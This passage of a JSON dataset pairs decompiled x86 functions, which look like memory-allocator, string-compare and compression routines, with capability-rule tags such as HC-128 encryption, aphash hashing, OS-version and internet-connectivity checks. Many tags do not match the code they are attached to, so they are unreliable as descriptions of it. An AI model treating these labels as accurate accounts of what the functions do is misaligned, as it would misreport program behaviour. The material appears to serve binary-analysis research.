            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040161c(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4a67ac);\n    *in_EAX = uVar3 + 0x4a67a8;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4a67ac) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4a67a8) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x4a6728;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x4a6724 = *0x4a6724 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 330
    },
    "004019fc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.004019fc(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401760();\n                ppuVar8 = *0x4a87b0;\n                *ppuVar10 = 0x4a87ac;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4a87b0;\n                *0x4a87b0 = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4a87a8 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x4a604d != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x4a6718 == 0;\n                *0x4a6718 = *0x4a6718 ^ bVar19 * (*0x4a6718 ^ 1);\n                if (bVar19) break;\n                if (*0x4a65b5 == '\\0') {\n                    sub.kernel32.dll_Sleep();\n                    LOCK();\n                    bVar19 = *0x4a6718 == 0;\n                    *0x4a6718 = *0x4a6718 ^ bVar19 * (*0x4a6718 ^ 1);\n                    if (bVar19) break;\n                    sub.kernel32.dll_Sleep();\n                }\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x4a6728);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x4a6724;\n            if (uVar15 == 0) {\n                if (*0x4a6720 < uVar18) {\n                    ppuVar10 = fcn.004016e8();\n                }\n                else {\n                    ppuVar10 = *0x4a671c - uVar18;\n                    *0x4a671c = ppuVar10;\n                    *0x4a6720 = *0x4a6720 - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x4a6718 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x4a6728);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4a67ac);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4a67ac) = piVar1;\n        *piVar1 = iVar13 + 0x4a67a8;\n        if (iVar13 + 0x4a67a8 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x4a6728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x4a6724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.0040161c();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x4a6718 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4a65c0) * 8;\n    puVar3 = iVar13 + 0x4a1044;\n    puVar16 = puVar3;\n    if (*0x4a604d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x4a1064;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x4a1084;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            if (*0x4a65b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                LOCK();\n                uVar7 = *puVar3;\n                *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n                puVar16 = puVar3;\n                if (uVar7 == 0) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x4a604d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x4a6718 == 0;\n            *0x4a6718 = *0x4a6718 ^ bVar19 * (*0x4a6718 ^ 1);\n            if (bVar19) break;\n            if (*0x4a65b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x4a6718 == 0;\n                *0x4a6718 = *0x4a6718 ^ bVar19 * (*0x4a6718 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    uVar17 = puVar16[1] & *0x4a6724;\n    if (uVar17 == 0) {\n        if (*0x4a6720 < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016e8();\n            if (ppuVar10 == NULL) {\n                *0x4a6718 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x4a6720;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x4a6720) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x4a671c - uVar17;\n            *0x4a6720 = *0x4a6720 - uVar17;\n            *0x4a671c = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x4a6728);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4a67ac);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4a67ac) = piVar1;\n        *piVar1 = iVar2 + 0x4a67a8;\n        if (iVar2 + 0x4a67a8 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x4a6728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x4a6724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.0040161c();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x4a6718 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3402
    },
    "00402c88": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00402c88(void)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    puVar2 = 0x4a1046;\n    uVar1 = 0;\n    do {\n        if ((*0x4a6706 == '\\0') || (uVar4 = uVar1,  (*puVar2 & 0xf) == 0)) {\n            uVar4 = *puVar2 >> 3;\n            for (; uVar1 < uVar4; uVar1 = uVar1 + 1) {\n                *(uVar1 + 0x4a65c0) = iVar3 * '\\x04';\n            }\n        }\n        iVar3 = iVar3 + 1;\n        puVar2 = puVar2 + 0x10;\n        uVar1 = uVar4;\n    } while (iVar3 != 0x37);\n    return;\n}\n",
        "token_count": 226
    },
    "00405894": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405894(uint param_1, char *param_2)\n\n{\n    uint32_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (in_EAX != param_2) {\n        if ((in_EAX & param_2) == 0) {\n            if (in_EAX == NULL) {\n                return NULL;\n            }\n            if (param_2 == NULL) {\n                return in_EAX;\n            }\n        }\n        if (*in_EAX - *param_2 == 0) {\n            uVar5 = *(in_EAX + -4) - *(param_2 + -4);\n            iVar3 = (((*in_EAX - *param_2) - 1) + (*(in_EAX + -4) < *(param_2 + -4)) & uVar5) - *(in_EAX + -4);\n            uVar2 = in_EAX - iVar3;\n            iVar4 = iVar3;\n            while (uVar6 = *(iVar4 + uVar2) ^ *(param_2 + (iVar4 - iVar3)),  uVar6 == 0) {\n                iVar4 = iVar4 + 4;\n                if (-1 < iVar4) goto code_r0x004058c4;\n            }\n            uVar1 = 0;\n            if (uVar6 != 0) {\n                for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n                }\n            }\n            iVar4 = iVar4 + (uVar1 >> 3);\n            if (iVar4 < 0) {\n                return uVar2 & 0xffffff00 | *(iVar4 + uVar2);\n            }\ncode_r0x004058c4:\n            in_EAX = uVar5 * 2;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 448
    },
    "004097e8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004097e8(uint param_1, uint8_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    if (in_EAX == param_2) {\n        return 0;\n    }\n    if ((in_EAX & param_2) == 0) {\n        if (in_EAX == NULL) {\n            return -*(param_2 + -4);\n        }\n        if (param_2 == NULL) {\n            return *(in_EAX + -4);\n        }\n    }\n    if (*param_2 != *in_EAX) {\n        return *in_EAX - *param_2;\n    }\n    uVar4 = *(in_EAX + -4) - *(param_2 + -4);\n    iVar2 = ((*(in_EAX + -4) < *(param_2 + -4)) - 1 & uVar4) - *(in_EAX + -4);\n    iVar3 = iVar2;\n    while (uVar5 = *(in_EAX + (iVar3 - iVar2)) ^ *(param_2 + (iVar3 - iVar2)),  uVar5 == 0) {\n        iVar3 = iVar3 + 4;\n        if (-1 < iVar3) {\n            return uVar4;\n        }\n    }\n    uVar1 = 0;\n    if (uVar5 != 0) {\n        for (; (uVar5 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    iVar3 = iVar3 + (uVar1 >> 3);\n    if (-1 < iVar3) {\n        return uVar4;\n    }\n    return in_EAX[iVar3 - iVar2] - param_2[iVar3 - iVar2];\n}\n",
        "token_count": 430
    },
    "004482cc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004482cc(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    uint8_t **in_EAX;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint8_t *puVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint8_t *puStack72;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack16;\n    \n    puVar1 = in_EAX[7];\n    puStack72 = *in_EAX + -1;\n    puVar12 = in_EAX[1] + -5 + puStack72;\n    puVar17 = in_EAX[3] + -1;\n    iVar13 = puVar17 - (param_2 - in_EAX[4]);\n    puVar10 = in_EAX[4] + -0x101 + puVar17;\n    iVar2 = puVar1[9];\n    uVar3 = puVar1[10];\n    uVar4 = puVar1[0xb];\n    iVar14 = puVar1[0xc];\n    uStack40 = puVar1[0xd];\n    uStack36 = puVar1[0xe];\n    iVar5 = puVar1[0x12];\n    iVar6 = puVar1[0x13];\n    uVar7 = puVar1[0x14];\n    uVar8 = puVar1[0x15];\ncode_r0x0044839a:\n    if (uStack36 < 0xf) {\n        puVar9 = puStack72 + 1;\n        puStack72 = puStack72 + 2;\n        uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n        uStack36 = uStack36 + 0x10;\n    }\n    uStack16 = *(iVar5 + (uStack40 & (1 << (uVar7 & 0x1f)) - 1U) * 4);\n    while( true ) {\n        uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n        uStack36 = uStack36 - uStack16._1_1_;\n        if ((uStack16 & 0xff) == 0) break;\n        if ((uStack16 & 0x10) != 0) {\n            uVar11 = uStack16._2_2_;\n            uVar19 = uStack16 & 0xf;\n            if ((uStack16 & 0xf) != 0) {\n                if (uStack36 < uVar19) {\n                    puStack72 = puStack72 + 1;\n                    uStack40 = uStack40 + (*puStack72 << (uStack36 & 0x1f));\n                    uStack36 = uStack36 + 8;\n                }\n                uVar11 = uVar11 + ((1 << uVar19) - 1U & uStack40);\n                uStack40 = uStack40 >> uVar19;\n                uStack36 = uStack36 - uVar19;\n            }\n            if (uStack36 < 0xf) {\n                puVar9 = puStack72 + 1;\n                puStack72 = puStack72 + 2;\n                uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n                uStack36 = uStack36 + 0x10;\n            }\n            uStack16 = *(iVar6 + (uStack40 & (1 << (uVar8 & 0x1f)) - 1U) * 4);\n            goto code_r0x004484ae;\n        }\n        if ((uStack16 & 0x40) != 0) {\n            if ((uStack16 & 0x20) == 0) {\n                in_EAX[6] = 0x4a2b88;\n                *puVar1 = 0x12;\n            }\n            else {\n                *puVar1 = 3;\n            }\n            goto code_r0x00448723;\n        }\n        uStack16 = *(iVar5 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    }\n    puVar17[1] = uStack16._2_1_;\n    puVar17 = puVar17 + 1;\n    goto code_r0x0044870f;\ncode_r0x004484ae:\n    uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n    uVar19 = uStack36 - uStack16._1_1_;\n    uStack36 = uVar19;\n    if ((uStack16 & 0x10) != 0) goto code_r0x004484ce;\n    if ((uStack16 & 0x40) != 0) {\n        in_EAX[6] = 0x4a2b72;\n        *puVar1 = 0x12;\n        goto code_r0x00448723;\n    }\n    uStack16 = *(iVar6 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    goto code_r0x004484ae;\ncode_r0x004484ce:\n    uStack16 = uStack16 & 0xf;\n    puVar9 = puStack72;\n    if (uVar19 < uStack16) {\n        uStack40 = uStack40 + (puStack72[1] << (uVar19 & 0x1f));\n        uStack36 = uVar19 + 8;\n        puVar9 = puStack72 + 1;\n        if (uStack36 < uStack16) {\n            uStack40 = uStack40 + (puStack72[2] << (uStack36 & 0x1f));\n            uStack36 = uVar19 + 0x10;\n            puVar9 = puStack72 + 2;\n        }\n    }\n    puStack72 = puVar9;\n    uVar19 = (1 << uStack16) - 1U & uStack40;\n    uStack40 = uStack40 >> uStack16;\n    uStack36 = uStack36 - uStack16;\n    uVar20 = puVar17 - iVar13;\n    uVar19 = uStack16._2_2_ + uVar19;\n    if (uVar20 < uVar19) {\n        uVar20 = uVar19 - uVar20;\n        if (uVar3 < uVar20) {\n            in_EAX[6] = 0x4a2b54;\n            *puVar1 = 0x12;\ncode_r0x00448723:\n            puStack72 = puStack72 + -(uStack36 >> 3);\n            iVar2 = uStack36 - (uStack36 & 0xfffffff8);\n            *in_EAX = puStack72 + 1;\n            in_EAX[3] = puVar17 + 1;\n            if (puStack72 < puVar12) {\n                iVar14 = puVar12 - puStack72;\n            }\n            else {\n                iVar14 = -(puStack72 - puVar12);\n            }\n            in_EAX[1] = iVar14 + 5;\n            if (puVar17 < puVar10) {\n                iVar14 = puVar10 - puVar17;\n            }\n            else {\n                iVar14 = -(puVar17 - puVar10);\n            }\n            in_EAX[4] = iVar14 + 0x101;\n            puVar1[0xd] = uStack40 & (1 << (iVar2 & 0x1f)) - 1U;\n            puVar1[0xe] = iVar2;\n            return;\n        }\n        iVar15 = iVar14 + -1;\n        puVar9 = puVar17;\n        if (uVar4 == 0) {\n            puVar16 = iVar15 + (iVar2 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        else if (uVar4 < uVar20) {\n            puVar16 = iVar15 + ((iVar2 + uVar4) - uVar20);\n            uVar20 = uVar20 - uVar4;\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = iVar14 + -1;\n                puVar9 = puVar17;\n                if (uVar4 < uVar11) {\n                    uVar11 = uVar11 - uVar4;\n                    uVar20 = uVar4;\n                    do {\n                        puVar17 = puVar17 + 1;\n                        puVar16 = puVar16 + 1;\n                        *puVar17 = *puVar16;\n                        uVar20 = uVar20 - 1;\n                    } while (uVar20 != 0);\n                    puVar16 = puVar17 + -uVar19;\n                    puVar9 = puVar17;\n                }\n            }\n        }\n        else {\n            puVar16 = iVar15 + (uVar4 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        for (; 2 < uVar11; uVar11 = uVar11 - 3) {\n            puVar17 = puVar16 + 2;\n            puVar9[1] = puVar16[1];\n            puVar16 = puVar16 + 3;\n            puVar9[2] = *puVar17;\n            puVar9[3] = *puVar16;\n            puVar9 = puVar9 + 3;\n        }\n        puVar17 = puVar9;\n        if (uVar11 != 0) {\n            puVar17 = puVar9 + 1;\n            *puVar17 = puVar16[1];\n            if (1 < uVar11) {\n                puVar17 = puVar9 + 2;\n                *puVar17 = puVar16[2];\n            }\n        }\n    }\n    else {\n        puVar9 = puVar17 + -uVar19;\n        do {\n            puVar18 = puVar17;\n            puVar16 = puVar9;\n            puVar18[1] = puVar16[1];\n            puVar18[2] = puVar16[2];\n            puVar17 = puVar18 + 3;\n            uVar11 = uVar11 - 3;\n            *puVar17 = puVar16[3];\n            puVar9 = puVar16 + 3;\n        } while (2 < uVar11);\n        if (uVar11 != 0) {\n            puVar17 = puVar18 + 4;\n            *puVar17 = puVar16[4];\n            if (1 < uVar11) {\n                puVar17 = puVar18 + 5;\n                *puVar17 = puVar16[5];\n            }\n        }\n    }\ncode_r0x0044870f:\n    if ((puVar12 <= puStack72) || (puVar10 <= puVar17)) goto code_r0x00448723;\n    goto code_r0x0044839a;\n}\n",
        "token_count": 2902
    },
    "0044b5e8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b5e8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (in_EAX[0x20] < 1) {\n        uVar2 = in_ECX + 5;\n        uVar3 = uVar2;\n    }\n    else {\n        if ((in_ECX != 0) && (*(*in_EAX + 0x2c) == 2)) {\n            fcn.0044bd80();\n        }\n        fcn.0044a560();\n        fcn.0044a560();\n        var_8h = fcn.0044af04();\n        uVar2 = in_EAX[0x5a9] + 10U >> 3;\n        uVar3 = in_EAX[0x5aa] + 10U >> 3;\n        if (uVar3 <= uVar2) {\n            uVar2 = uVar3;\n        }\n    }\n    if ((uVar2 < in_ECX + 4U) || (in_EDX == 0)) {\n        if ((in_EAX[0x21] == 4) || (uVar2 == uVar3)) {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 2U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0044b8c0();\n        }\n        else {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 4U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0044af68(var_8h + 1);\n            fcn.0044b8c0();\n        }\n    }\n    else {\n        fcn.0044b260(arg_8h);\n    }\n    fcn.0044a190();\n    if (arg_8h != 0) {\n        fcn.0044be5c();\n    }\n    return;\n}\n",
        "token_count": 1098
    },
    "00401760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401760(void)\n\n{\n    char cVar1;\n    \n    if (*0x4a604d != '\\0') {\n        while (cVar1 = fcn.00401450(),  cVar1 != '\\0') {\n            if (*0x4a65b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                cVar1 = fcn.00401450();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "004022e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004022e4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x4a6720 != 0) && (in_EAX <= *0x4a671c)) && (*0x4a671c <= in_EAX + 0x13fff0)) {\n        uVar1 = *0x4a671c;\n        if (*0x4a6720 == 0x13ffe0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 141
    },
    "004025b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
